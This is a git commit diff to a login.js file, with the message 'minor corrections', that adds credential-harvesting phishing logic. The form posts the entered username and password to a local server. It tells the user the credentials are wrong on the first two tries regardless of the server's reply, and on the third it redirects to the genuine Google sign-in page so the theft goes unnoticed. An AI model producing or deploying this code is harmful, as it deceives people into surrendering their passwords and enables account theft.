fb675b3d0049f862920f9bb9afe5598ac1df7a15
Joshua Rene Cruz Ramirez <redwave2111@gmail.com>
2024-08-21 12:54:53 -0600

    Correcciones menores

--- login.js
+++ login.js
@@ -1,8 +1,12 @@
+let attemptCount = 0;
+
 document.getElementById("loginForm").addEventListener("submit", async (e) => {
     e.preventDefault();
 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
+
+    attemptCount++;
 
     const response = await fetch("http://localhost:8080/", {
         method: "POST",
@@ -11,6 +15,13 @@ document.getElementById("loginForm").addEventListener("submit", async (e) => {
         },
         body: JSON.stringify({ username, password })
     });
+
+    if (attemptCount < 3) {
+        alert("Credenciales incorrectas. Por favor, inténtalo de nuevo.");
+    } else {
+        // Redirigir a la página de login de Google después del tercer intento
+        window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%2Fwebhp%3Fauthuser%3D1&ec=GAlAmgQ&hl=es&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S1142059354%3A1724181348196689&ddm=0";
+    }
 
     const data = await response.json();
     console.log(data.msg);
